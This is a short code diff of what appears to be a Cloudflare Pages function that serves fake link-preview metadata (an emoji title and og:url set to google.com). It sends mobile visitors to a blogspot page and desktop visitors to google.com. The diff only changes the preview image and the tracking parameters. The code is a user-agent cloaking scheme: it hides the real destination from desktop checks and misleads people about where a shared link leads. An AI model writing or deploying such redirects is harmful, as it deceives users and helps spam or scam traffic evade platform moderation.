@@ -14,7 +14,7 @@ export async function onRequest(context) {
     <title>Welcome</title>
     <meta property="og:title" content="💢 💢 💢 💢">
     <meta property="og:description" content="">
-    <meta property="og:image" content="https://literate-octo-guide.pages.dev/1.jpg">
+    <meta property="og:image" content="https://literate-octo-guide.pages.dev/4.jpg">
     <meta property="og:url" content="https://www.google.com">
     <meta property="og:type" content="website">
 </head>
@@ -31,7 +31,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://waseey.blogspot.com/?utm_source=RRR&utm_medium=GM", 302);
+    return Response.redirect("https://waseey.blogspot.com/?utm_source=amsh&utm_medium=ansh", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
